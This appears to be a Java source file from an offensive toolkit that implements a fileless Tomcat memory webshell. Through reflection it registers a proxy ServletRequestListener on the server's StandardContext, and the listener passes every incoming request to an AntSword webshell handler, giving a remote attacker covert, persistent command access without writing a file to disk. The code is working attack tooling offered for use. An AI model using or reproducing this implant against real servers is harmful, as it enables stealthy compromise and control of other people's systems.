package com.spkiddai.memoryserver.Msmap;

import java.lang.reflect.*;

import static com.spkiddai.memoryserver.Tools.ClassLoaderTools.*;
import static com.spkiddai.memoryserver.Tools.ReflectionTools.*;
import com.spkiddai.memoryserver.Tools.AntSwordTool;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class TomcatListener implements InvocationHandler {

    private void hook(Object servletRequestEvent) throws Exception {
        Object servletRequest = invokeMethod(
            servletRequestEvent, "getServletRequest"
        );
        Object request = getFieldValue(servletRequest, "request");
        Object response = invokeMethod(request, "getResponse");
        AntSwordTool antswordUtil = new AntSwordTool();
        antswordUtil.exec((HttpServletRequest) request, (HttpServletResponse) response);
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args)
            throws Throwable {
        if (method.getName().equals("requestInitialized")) {
            Object servletRequestEvent = args[0];
            hook(servletRequestEvent);
        }
        return null;
    }

    private void addListener(Object proxyObject) throws Exception {
        Object context = getStandardContext();
        for (Object listener :
            (Object[]) invokeMethod(context, "getApplicationEventListeners")
        ) {
            if (listener instanceof Proxy) {
                return;
            }
        }
        getMethodX(context.getClass(), "addApplicationEventListener", 1)
            .invoke(context, proxyObject);
    }

    public void Register() {
        Class servletRequestListener = null;
        try {
            servletRequestListener = Class.forName(
                "javax.servlet.ServletRequestListener"
            );
        } catch (ClassNotFoundException e) {
            try {
                servletRequestListener = Class.forName(
                    "jakarta.servlet.ServletRequestListener"
                );
            } catch (ClassNotFoundException ex) {}
        }

        if (servletRequestListener != null) {
            Object proxyObject = Proxy.newProxyInstance(
                getLoader(), new Class[]{servletRequestListener}, this
            );
            try {
                addListener(proxyObject);
            } catch (Exception e) {}
        }
    }
}
